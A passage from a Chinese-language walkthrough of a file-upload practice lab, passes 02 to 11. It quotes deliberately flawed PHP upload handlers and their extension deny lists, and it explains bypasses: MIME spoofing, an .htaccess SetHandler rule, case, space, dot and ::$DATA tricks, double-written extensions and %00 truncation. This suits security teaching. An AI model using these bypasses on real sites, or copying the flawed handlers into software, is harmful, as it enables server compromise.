class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现了关键的判断是对<code>type</code>的判断，由此想到是对文件MIME类型进行验证；</p><p>上面的黑盒条件下的尝试也是偶然的巧合，因为刚开始的脚本被改成了<code>.jpg</code>为后缀，所以bp截包所看见的MIME检测到的类型就理所当然是<code>image/jpeg</code>，所以在这样的情况下将<code>.jpg</code>修改为<code>.php</code>就可以上传成功；</p><p><a href="https://imgchr.com/i/kavVtU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kavVtU.png" alt="kavVtU.png"></a></p><p>正确的姿势如下：</p><p>上传<code>.php</code>文件，截包，发现MIME类型如下：</p><p><a href="https://imgchr.com/i/kavGtO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kavGtO.png" alt="kavGtO.png"></a></p><p>修改<code>Content-Type</code>为代码中pass的类型即可：</p><p><a href="https://imgchr.com/i/kavHCF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kavHCF.png" alt="kavHCF.png"></a></p><p>上传成功：</p><p><img src="https://s2.ax1x.com/2019/02/11/kaxVbt.png" alt="kaxVbt.png"></p><h3 id="pass-03-上传特殊可解析后缀"><a href="#pass-03-上传特殊可解析后缀" class="headerlink" title="pass-03-上传特殊可解析后缀"></a>pass-03-上传特殊可解析后缀</h3><p><strong>solution1</strong></p><p>黑盒情况下上传<code>.php</code>文件得到提示：不允许上传.asp .aspx .php .jsp后缀文件！猜测应该是设置了黑名单；于是尝试上传<code>.php5</code>为后缀的文件，上传成功并且成功回显访问路径；</p><p><img src="https://s2.ax1x.com/2019/02/11/kaxIsA.png" alt="kaxIsA.png"></p><p>但奇怪的是<code>php5</code>无法被服务器解析，经Google得知是apache服务器配置的问题，在<code>httpd.conf</code>文件中查看是否有如下语句，如果没有，添加即可；</p><p><code>AddType application/x-httpd-php .php .phtml .php5 .phps .php3 .pht</code></p><p><a href="https://imgchr.com/i/kaz0Ff" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kaz0Ff.png" alt="kaz0Ff.png"></a></p><p>审计源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);<span class="comment">//黑名单</span></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显是设置了黑名单的<code>$deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</code>而且其中将文件名进行了改写，所以访问文件的时候路径需要注意；</p><p><strong>solution2</strong></p><p>如果发现上传<code>.php5,.phtml,.pht</code>一类无法解析，就可以尝试使用<code>.htaccess</code>；见pass-04；</p><h3 id="pass-04-上传-htaccess"><a href="#pass-04-上传-htaccess" class="headerlink" title="pass-04-上传.htaccess"></a>pass-04-上传.htaccess</h3><p>这题在黑盒情况下测试pass-03的多数情况都是不可以的，查看一下源码：</p><p><code>$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</code></p><p>发现黑名单过滤了几乎所有的我了解到的特殊后缀，唯独没有过滤<code>.htaccess</code>，所以可以通过上传此文件达到重写文件解析，前提是apache的配置文件conf里有这样配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><p>于是创建<code>.htaccess</code>文件内容如下，上传，用于解析指定路径里指定文件名的文件为php脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;gardenia&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>此时创建文件名为<code>gardenia</code>的php脚本文件，无需后缀名，上传即可解析为php脚本；</p><p>解析成功：</p><p><img src="https://s2.ax1x.com/2019/02/12/kwhR2V.png" alt="kwhR2V.png"></p><h3 id="pass-05-大小写绕过"><a href="#pass-05-大小写绕过" class="headerlink" title="pass-05-大小写绕过"></a>pass-05-大小写绕过</h3><p>在黑盒情况下，发现无法上传.htaccess文件和其他特殊后缀，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将pass-05的源码与pass-04的对比：</p><p><a href="https://imgchr.com/i/kw5Jpt" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kw5Jpt.md.png" alt="kw5Jpt.md.png"></a></p><p>发现pass-05多过滤了<code>.htaccess</code>文件，但是没有将读出的后缀名进行统一转换为小写，所以可以直接构造<code>.Php</code>后缀的文件进行上传即可；</p><p><a href="https://imgchr.com/i/kw5ypq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kw5ypq.md.png" alt="kw5ypq.md.png"></a></p><p>访问成功：</p><p><img src="https://s2.ax1x.com/2019/02/12/kw5RnU.png" alt="kw5RnU.png"></p><h3 id="pass-06-空格绕过"><a href="#pass-06-空格绕过" class="headerlink" title="pass-06-空格绕过"></a>pass-06-空格绕过</h3><p>查看源码，与pass-05进行对比：</p><p><a href="https://imgchr.com/i/kwTBAe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kwTBAe.md.png" alt="kwTBAe.md.png"></a></p><p>对后缀进行了小写转换，但是从头到尾没有添加对文件名的首尾去空处理，所以直接在文件后缀后面加上空格即可绕过；</p><p>上传成功：</p><p><a href="https://imgchr.com/i/kwT5NQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kwT5NQ.md.png" alt="kwT5NQ.md.png"></a></p><p>访问成功：</p><p><a href="https://imgchr.com/i/kwT73n" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kwT73n.png" alt="kwT73n.png"></a></p><h3 id="pass-07-点绕过"><a href="#pass-07-点绕过" class="headerlink" title="pass-07-点绕过"></a>pass-07-点绕过</h3><p>对比pass-06的源码：</p><p><img src="https://s2.ax1x.com/2019/02/12/kw7R2R.png" alt="kw7R2R.png"></p><p>发现这次是缺少了<code>$file_name = deldot($file_name);</code>删除文件名末尾的点这一步的操作；</p><p>于是想到在文件后缀最后加上<code>.</code>来绕过判断，成功上传：</p><p><img src="https://s2.ax1x.com/2019/02/12/kw77Ie.png" alt="kw77Ie.png"></p><p>成功访问：</p><p><img src="https://s2.ax1x.com/2019/02/12/kw7qGd.png" alt="kw7qGd.png"></p><h3 id="pass-08-DATA绕过"><a href="#pass-08-DATA绕过" class="headerlink" title="pass-08-::$DATA绕过"></a>pass-08-::$DATA绕过</h3><p>这次经过对比，源码中缺少的是如下语句：</p><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);</code>用来去除字符串::$DATA；所以这次可以直接构造<code>gardenia.php::$DATA</code>来绕过源码中的过滤；上传成功如下：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0abrV.png" alt="k0abrV.png"></p><p>访问成功：</p><p><a href="https://imgchr.com/i/k0dwLV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0dwLV.md.png" alt="k0dwLV.md.png"></a></p><h3 id="pass-09-二次绕过"><a href="#pass-09-二次绕过" class="headerlink" title="pass-09-二次绕过"></a>pass-09-二次绕过</h3><p>审计源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次源码似乎挺正常，没有前面几处的缺失，一开始也是没有想到可以这样绕过，后来经过思考，发现源码对后缀名只是进行了一个轮次的处理，如果逆向思考，构造一个后缀，经过这一轮处理以后还是可以绕过呢？于是构造<code>gardenia.php. .</code>，经过去点，去空处理后得到<code>gardenia.php.</code>相当于点绕过；</p><p>上传成功：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0BCMn.png" alt="k0BCMn.png"></p><p>访问成功：</p><p><img src="https://s2.ax1x.com/2019/02/13/k00r8J.png" alt="k00r8J.png"></p><h3 id="pass-10-双写绕过"><a href="#pass-10-双写绕过" class="headerlink" title="pass-10-双写绕过"></a>pass-10-双写绕过</h3><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>是关键点，将文件名中出现的带有黑名单的部分替换为空；</p><p>测试脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $black=<span class="string">"php"</span>;</span><br><span class="line">    $filename=<span class="string">"gardenia.pphphp"</span>;</span><br><span class="line">    $ans=str_ireplace($black,<span class="string">""</span>,$filename);</span><br><span class="line">    <span class="keyword">echo</span> $ans;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：gardenia.php</span><br></pre></td></tr></table></figure><p>如上，直接双写构造<code>gardenia.pphphp</code>即可；</p><p><a href="https://imgchr.com/i/k0s6JO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0s6JO.md.png" alt="k0s6JO.md.png"></a></p><p>访问成功：</p><p><a href="https://imgchr.com/i/k0sRQH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0sRQH.md.png" alt="k0sRQH.md.png"></a></p><h3 id="pass-11-00截断-GET"><a href="#pass-11-00截断-GET" class="headerlink" title="pass-11-00截断(GET)"></a>pass-11-00截断(GET)</h3><p>审计一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看关键源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p>发现是得到合法后缀名后给定一个<code>$img_path</code>的文件存储路径，构成方法如上，需要GET一个<code>save_path</code>，但是不知道在哪GET…，没办法抓个包试试，发现了GET的参数；</p><p><a href="https://imgchr.com/i/k0ID0S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0ID0S.md.png" alt="k0ID0S.md.png"></a></p><p>直接修改GET参数即可，构造payload如下；</p><p><img src="https://s2.ax1x.com/2019/02/13/k0I6Yj.png" alt="k0I6Yj.png"></p><p><code>%00</code>为url编码的00，可以使<code>$img_path</code>的值从<code>00</code>结束，所以文件的最终路径为<code>../upload/gardenia.php</code>可以解析为php脚本；运行成功如下：</p><p><a href="https://imgchr.com/i/k0I7tJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0I7tJ.md.png" alt="k0I7tJ.md.png"></a></p><ul><li><strong>Attention：</strong>需要特别注意的是00截断的前提：</li></ul><ol><li>php版本小于5.3.4；</li><li>php.ini的<code>magic_quotes_gpc</code>为Off状态；</li></ol><h3 id="pass-12-00截断-POST"><a href="#pass-12-00截断-POST" class="headerlink" 